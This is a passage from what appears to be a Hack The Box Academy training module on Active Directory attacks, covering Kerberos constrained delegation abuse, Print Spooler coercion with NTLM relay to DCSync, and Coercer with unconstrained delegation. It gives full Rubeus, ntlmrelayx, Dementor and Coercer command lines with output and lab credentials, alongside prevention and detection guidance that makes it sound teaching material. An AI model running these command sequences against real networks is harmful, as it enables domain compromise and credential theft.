  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1


[*] Action: Calculate Password Hash(es)

[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/phash.png" alt="PassToHash"></p>
<p>Then, we will use <code>Rubeus</code> to get a ticket for the <code>Administrator</code> account:</p>
<p>Kerberos Constrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:<span class="hljs-string">"http/dc1"</span> /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1

[*] Action: S4U

[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFiDCCBYSgAwIBBaEDAgEWooIEnjCCBJphggSWMIIEkqADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtlYWdsZS5sb2NhbKOCBFgwggRUoAMCARKhAwIBAqKCBEYEggRCI1ghAg72
      moqMS1skuua6aCpknKibZJ6VEsXfyTZgO5IKRDnYHnTJT6hwywSoXpcxbFDDlakB56re10E6f6H9u5Aq
      ...
      ...
      ...
[+] Ticket successfully imported!</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/getTicket.png" alt="Obtain ticket"></p>
<p>To confirm that <code>Rubeus</code> injected the ticket in the current session, we can use the <code>klist</code> command:</p>
<p>Kerberos Constrained Delegation</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">bob</span>\<span class="hljs-selector-tag">Downloads</span>&gt; <span class="hljs-selector-tag">klist</span>

<span class="hljs-selector-tag">Current</span> <span class="hljs-selector-tag">LogonId</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">0</span><span class="hljs-selector-pseudo">:0x88721</span>

<span class="hljs-selector-tag">Cached</span> <span class="hljs-selector-tag">Tickets</span>: (<span class="hljs-number">1</span>)

<span class="hljs-selector-id">#0</span>&gt;     <span class="hljs-selector-tag">Client</span>: <span class="hljs-selector-tag">Administrator</span> @ <span class="hljs-selector-tag">EAGLE</span><span class="hljs-selector-class">.LOCAL</span>
        <span class="hljs-selector-tag">Server</span>: <span class="hljs-selector-tag">http</span>/<span class="hljs-selector-tag">dc1</span> @ <span class="hljs-selector-tag">EAGLE</span><span class="hljs-selector-class">.LOCAL</span>
        <span class="hljs-selector-tag">KerbTicket</span> <span class="hljs-selector-tag">Encryption</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">AES-256-CTS-HMAC-SHA1-96</span>
        <span class="hljs-selector-tag">Ticket</span> <span class="hljs-selector-tag">Flags</span> <span class="hljs-selector-tag">0x40a50000</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">forwardable</span> <span class="hljs-selector-tag">renewable</span> <span class="hljs-selector-tag">pre_authent</span> <span class="hljs-selector-tag">ok_as_delegate</span> <span class="hljs-selector-tag">name_canonicalize</span>
        <span class="hljs-selector-tag">Start</span> <span class="hljs-selector-tag">Time</span>: <span class="hljs-selector-tag">10</span>/<span class="hljs-selector-tag">13</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">14</span><span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:07</span> (local)
        <span class="hljs-selector-tag">End</span> <span class="hljs-selector-tag">Time</span>:   <span class="hljs-selector-tag">10</span>/<span class="hljs-selector-tag">14</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">0</span><span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:07</span> (local)
        <span class="hljs-selector-tag">Renew</span> <span class="hljs-selector-tag">Time</span>: <span class="hljs-selector-tag">10</span>/<span class="hljs-selector-tag">20</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">14</span><span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:07</span> (local)
        <span class="hljs-selector-tag">Session</span> <span class="hljs-selector-tag">Key</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">AES-128-CTS-HMAC-SHA1-96</span>
        <span class="hljs-selector-tag">Cache</span> <span class="hljs-selector-tag">Flags</span>: <span class="hljs-selector-tag">0</span>
        <span class="hljs-selector-tag">Kdc</span> <span class="hljs-selector-tag">Called</span>:
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/klistdelegated.png" alt="klist"></p>
<p>With the ticket being available, we can connect to the Domain Controller impersonating the account <code>Administrator</code>:</p>
<p>Kerberos Constrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\D</span>ownloads&gt; Enter-PSSession dc1
[dc1]: PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\D</span>ocuments&gt; hostname
DC1
[dc1]: PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\D</span>ocuments&gt; whoami
eagle<span class="hljs-symbol">\a</span>dministrator
[dc1]: PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\D</span>ocuments&gt;
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/pssession.png" alt="Enter PSSession"></p>
<p>If the last step fails (we may need to do <code>klist purge</code>, obtain new tickets, and try again by rebooting the machine). We can also request tickets for multiple services with the <code>/altservice</code> argument, such as <code>LDAP</code>, <code>CFIS</code>, <code>time</code>, and <code>host</code>.</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>Fortunately, when designing Kerberos Delegation, Microsoft implemented several protection mechanisms; however, it did not enable them by default to any user account. There are two direct ways to prevent a ticket from being issued for a user via delegation:</p>
<ul>
<li>Configure the property <code>Account is sensitive and cannot be delegated</code> for all privileged users.</li>
<li>Add privileged users to the <code>Protected Users</code> group: this membership automatically applies the protection mentioned above (however, it is not recommended to use <code>Protected Users</code> without first understanding its potential implications).</li>
</ul>
<p>We should treat any account configured for delegation as extremely privileged, regardless of its actual privileges (such as being only a Domain user). Cryptographically secure passwords are a must, as we don&#39;t want <code>Kerberoasting</code> giving threat agents an account with delegation privileges.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>Correlating users&#39; behavior is the best technique to detect <code>constrained delegation</code> abuse. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account &#39;Administrator&#39; in the attack described above. If a mature organization uses Privileged Access Workstations (PAWs), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID <code>4624</code> (successful logon).</p>
<p>In some occasions, a successful logon attempt with a delegated ticket will contain information about the ticket&#39;s issuer under the <code>Transited Services</code> attribute in the events log. This attribute is normally populated if the logon resulted from an <code>S4U</code> (<code>Service For User</code>) logon process.</p>
<p>S4U is a Microsoft extension to the Kerberos protocol that allows an application service to obtain a Kerberos service ticket on behalf of a user; if we recall from the attack flow when utilizing <code>Rubeus</code>, we specified this <code>S4U</code> extension. Here is an example logon event by using the web service to generate a ticket for the user Administrator, which then was used to connect to the Domain Controller (precisely as the attack path above):</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/detect1.png" alt="Successful logon"></p>
<h2 id="print-spooler-ntlm-relaying">Print Spooler &amp; NTLM Relaying</h2>
<hr>
<h3 id="description">Description</h3>
<p>The <a href="https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler">Print Spooler</a> is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, <code>Lee Christensen</code> found the <code>PrinterBug</code>. The functions <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83">RpcRemoteFindFirstPrinterChangeNotification</a> and <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d">RpcRemoteFindFirstPrinterChangeNotificationEx</a> can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the <code>reverse</code> connection will carry authentication information as a <code>TGT</code>. Therefore, any domain user can coerce <code>RemoteServer$</code> to authenticate to any machine. Microsoft&#39;s stance on the <code>PrinterBug</code> was that it will not be fixed, as the issue is &quot;by-design&quot;.</p>
<p>The impact of <code>PrinterBug</code> is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:</p>
<ol>
<li>Relay the connection to another DC and perform DCSync (if <code>SMB Signing</code> is disabled).</li>
<li>Force the Domain Controller to connect to a machine configured for <code>Unconstrained Delegation</code> (<code>UD</code>) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like <code>Rubeus</code> and <code>Mimikatz</code>.</li>
<li>Relay the connection to <code>Active Directory Certificate Services</code> to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).</li>
<li>Relay the connection to configure <code>Resource-Based Kerberos Delegation</code> for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.</li>
</ol>
<hr>
<h3 id="attack">Attack</h3>
<p>In this attack path, we will relay the connection to another DC and perform <code>DCSync</code> (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.</p>
<p>To begin, we will configure <code>NTLMRelayx</code> to forward any connections to DC2 and attempt to perform the DCSync attack:</p>
<p>Print Spooler &amp; NTLM Relaying</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-ntlmrelayx -t dcsync://<span class="hljs-number">172.16</span><span class="hljs-number">.18</span><span class="hljs-number">.4</span> -smb2support

<span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.10</span><span class="hljs-number">.0</span> - <span class="hljs-symbol">Copyright</span> <span class="hljs-number">2022</span> <span class="hljs-symbol">SecureAuth</span> <span class="hljs-symbol">Corporation</span>

[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMTP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">LDAPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">DCSYNC</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">IMAPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">RPC</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTP</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">HTTPS</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">MSSQL</span> loaded..
[*] <span class="hljs-symbol">Protocol</span> <span class="hljs-symbol">Client</span> <span class="hljs-symbol">SMB</span> loaded..
[*] <span class="hljs-symbol">Running</span> in relay mode to single host
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">SMB</span> <span class="hljs-symbol">Server</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">HTTP</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">80</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">WCF</span> <span class="hljs-symbol">Server</span>
[*] <span class="hljs-symbol">Setting</span> up <span class="hljs-symbol">RAW</span> <span class="hljs-symbol">Server</span> on port <span class="hljs-number">6666</span>

[*] <span class="hljs-symbol">Servers</span> started, waiting for connections
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A10/startntlmrelayx.png" alt="NTLMRelay starting"></p>
<p>Next, we need to trigger the <code>PrinterBug</code> using the Kali box with <code>NTLMRelayx</code> listening. To trigger the connection back, we&#39;ll use <a href="https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py">Dementor</a> (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):</p>
<p>Print Spooler &amp; NTLM Relaying</p>
<pre><code class="lang-shell-session">python3 ./dementor<span class="hljs-selector-class">.py</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">18.20</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">18.3</span> -u bob -d eagle<span class="hljs-selector-class">.local</span> -<span class="hljs-selector-tag">p</span> Slavi123

[*] connecting to <span class="hljs-number">172.16</span>.<span class="hljs-number">18.3</span>
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: <span class="hljs-selector-tag">code</span>: <span class="hljs-number">0</span>x6ab - RPC_S_INVALID_NET_ADDR - The network <span class="hljs-selector-tag">address</span> is invalid.
[*] done!
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A10/dementor.png" alt="Dementor"></p>
<p>Now, switching back to the terminal session with <code>NTLMRelayx</code>, we will see that DCSync was successful:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A10/hashes.png" alt="Hashes"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.</p>
<p>Additionally, there is an option to prevent the abuse of the <code>PrinterBug</code> while keeping the service running: when disabling the registry key <code>RegisterSpoolerRemoteRpcEndPoint</code>, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A10/registry.png" alt="Prevent via registry key"></p>
<hr>
<h3 id="detection">Detection</h3>
<p>Exploiting the <code>PrinterBug</code> will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.</p>
<p>In the case of using <code>NTLMRelayx</code> to perform DCSync, no event ID <code>4662</code> is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller, as we can see below:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A10/detectDCSync.png" alt="Detection"></p>
<p>A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>It is possible to use the <code>PrinterBug</code> as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports <code>139</code> and <code>445</code>; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).</p>
<p>While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.</p>
<h2 id="coercing-attacks-unconstrained-delegation">Coercing Attacks &amp; Unconstrained Delegation</h2>
<hr>
<h3 id="description">Description</h3>
<p>Coercing attacks have become a <code>one-stop shop</code> for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We&#39;ve just tasted coercing attacks when we discussed the <code>PrinterBug</code>. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce <code>RemoteServer$</code> to authenticate to any machine in the domain. Eventually, the <a href="https://github.com/p0dalirius/Coercer">Coercer</a> tool was developed to exploit all known vulnerable RPC functions simultaneously.</p>
<p>Similar to the <code>PrinterBug</code>, an attacker can choose from several &quot;follow up&quot; options with the reverse connection, which, as mentioned before, are:</p>
<ol>
<li>Relay the connection to another DC and perform DCSync (if <code>SMB Signing</code> is disabled).</li>
<li>Force the Domain Controller to connect to a machine configured for <code>Unconstrained Delegation</code> (<code>UD</code>) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like <code>Rubeus</code> and <code>Mimikatz</code>.</li>
<li>Relay the connection to <code>Active Directory Certificate Services</code> to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).</li>
<li>Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.</li>
</ol>
<hr>
<h3 id="attack">Attack</h3>
<p>We will abuse the second &quot;follow-up&quot;, assuming that an attacker has gained administrative rights on a server configured for <code>Unconstrained Delegation</code>. We will use this server to capture the TGT, while <code>Coercer</code> will be executed from the Kali machine.</p>
<p>To identify systems configured for <code>Unconstrained Delegation</code>, we can use the <code>Get-NetComputer</code> function from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> along with the <code>-Unconstrained</code> switch:</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; Get-NetComputer -Unconstrained | select samaccountname

<span class="hljs-section">samaccountname
--------------</span>
DC1$
SERVER01$
WS001$
DC2$
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/GetNetComputer.png" alt="Find Unconstrained Delegation"></p>
<p><code>WS001</code> and <code>SERVER01</code> are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and &#39;Bob&#39;, who has administrative rights on this host. We will start <code>Rubeus</code> in an administrative prompt to monitor for new logons and extract TGTs:</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe monitor /interval:1

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 18/12/2022 22.37.09 UTC - Found new TGT:

  User                  :  bob@EAGLE.LOCAL
  StartTime             :  18/12/2022 23.30.09
  EndTime               :  19/12/2022 09.30.09
  RenewTill             :  25/12/2022 23.30.09
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

doIE2jCCBNagAwIBBaEDAgEWooID5zCCA+NhggPfMIID26ADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0
GwtFQUdMRS5MT0NBTKOCA6EwggOdoAMCARKhAwIBAqKCA48EggOLxoWz+JE4JEP9VvNlDvGKzqQ1BjjpjjO03haKFPPeszM4Phkb    QQBPfixBqQ3bthdsizmx3hdjNzFVKnUOK2h2CDFPeUia+0rCn1FllimXQwdEFMri7whC2qA4/vy52Y2jJdmkR7ZIRAeU5Yfm373L
iEHgnX4PCA94Ck/BEwUY0bk6VAWkM2FSPgnuiCeQQ4yJMPa3DK6MHYJ/1kZy+VqxwSqov/tVhATshel1vXpr4rz03ofgNtwLDYb+    K5AGYSbSct5w1jTWtGAicCCr1vpcUguIWH0Nh1lQ+tZccVtEtsrjZ/jwCKsadQWIFwhPOnVpf5drUlav1iCXmxWqQr5glW/IOOE1
lHsBolieGSyY20ZHBYjXflCGkO13mRwqO3rQ5KMs8HrC3Aqu7Popaw29at0vzZLinYnWnHUn01hh5e3QyIkqIH3CBvaPbl3RukZ7    jZRBm6BVF7R5KEWp+6Gg2joP6WvXDBCIzqL3jmxQ8NVoeeidgnBuZKpYL45E8jJjxbW4t9D8EdlX9Xu+fj/Fazw08HtRkzwG30vE
    &lt;SNIP&gt;
    &lt;SNIP&gt;
    &lt;SNIP&gt;

[*] Ticket cache size: 4</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/RubeusMonitor.png" alt="Rubeus Monitor TGTs"></p>
<p>Next, we need to know the IP address of WS001, which we can be obtain by running <code>ipconfig</code>. Once known, we will switch to the Kali machine to execute <code>Coercer</code> towards DC1, while we force it to connect to WS001 if coercing is successful:</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.<span class="hljs-number">6</span>
    \____/\____/\___/_/   \___/\___/_/       <span class="hljs-keyword">by</span> @podalirius_

[dc1.eagle.local] Analyzing available protocols <span class="hljs-keyword">on</span> the remote machine <span class="hljs-keyword">and</span> perform RPC calls <span class="hljs-keyword">to</span> coerce authentication <span class="hljs-keyword">to</span> ws001.eagle.local ...
   [&gt;] Pipe <span class="hljs-string">'\PIPE\lsarpc'</span> <span class="hljs-keyword">is</span> accessible!
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcOpenFileRaw'</span> (opnum <span class="hljs-number">0</span>) ... rpc_s_access_denied
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcEncryptFileSrv'</span> (opnum <span class="hljs-number">4</span>) ... ERROR_BAD_NETPATH (Attack <span class="hljs-keyword">has</span> worked!)
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcDecryptFileSrv'</span> (opnum <span class="hljs-number">5</span>) ... ERROR_BAD_NETPATH (Attack <span class="hljs-keyword">has</span> worked!)
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcQueryUsersOnFile'</span> (opnum <span class="hljs-number">6</span>) ... ERROR_BAD_NETPATH (Attack <span class="hljs-keyword">has</span> worked!)
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcQueryRecoveryAgents'</span> (opnum <span class="hljs-number">7</span>) ... ERROR_BAD_NETPATH (Attack <span class="hljs-keyword">has</span> worked!)
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\lsarpc'</span> targeting <span class="hljs-string">'MS-EFSR::EfsRpcEncryptFileSrv'</span> (opnum <span class="hljs-number">12</span>) ... ERROR_BAD_NETPATH (Attack <span class="hljs-keyword">has</span> worked!)
   [&gt;] Pipe <span class="hljs-string">'\PIPE\netdfs'</span> <span class="hljs-keyword">is</span> accessible!
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\netdfs'</span> targeting <span class="hljs-string">'MS-DFSNM::NetrDfsAddStdRoot'</span> (opnum <span class="hljs-number">12</span>) ... rpc_s_access_denied (Attack should have worked!)
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\netdfs'</span> targeting <span class="hljs-string">'MS-DFSNM::NetrDfsRemoveStdRoot'</span> (opnum <span class="hljs-number">13</span>) ...       [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\netdfs'</span> targeting <span class="hljs-string">'MS-DFSNM::NetrDfsRemoveStdRoot'</span> (opnum <span class="hljs-number">13</span>) ...       [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\netdfs'</span> targeting <span class="hljs-string">'MS-DFSNM::NetrDfsRemoveStdRoot'</span> (opnum <span class="hljs-number">13</span>) ...       [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\netdfs'</span> targeting <span class="hljs-string">'MS-DFSNM::NetrDfsRemoveStdRoot'</span> (opnum <span class="hljs-number">13</span>) ...    [&gt;] Pipe <span class="hljs-string">'\PIPE\spoolss'</span> <span class="hljs-keyword">is</span> accessible!
      [&gt;] <span class="hljs-keyword">On</span> <span class="hljs-string">'dc1.eagle.local'</span> through <span class="hljs-string">'\PIPE\spoolss'</span> targeting <span class="hljs-string">'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx'</span> (opnum <span class="hljs-number">65</span>) ... rpc_s_access_denied (Attack should have worked!)

[+] All done!
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A11/Coercer.png" alt="Coercer to DC1"></p>
<p>Now, if we switch to WS001 and look at the continuous output that <code>Rubeus</code> provide, there should be a TGT for DC1 available:</p>
<p>Coercing Attacks &amp; Unconstrained Delegation</p>
<pre><code class="lang-powershell-session">[*] <span class="hljs-number">18</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">22.55</span><span class="hljs-number">.52</span> UTC - Found <span class="hljs-keyword">new</span> <span class="hljs-string">TGT:</span>

  <span class="hljs-string">User                  :</span>  DC1$<span class="hljs-meta">@EAGLE</span>.LOCAL
  <span class="hljs-string">StartTime             :</span>  <span class="hljs-number">18</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">23.30</span><span class="hljs-number">.21</span>
  <span class="hljs-string">EndTime               :</span>  <span class="hljs-number">19</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">09.30</span><span class="hljs-number">.21</span>
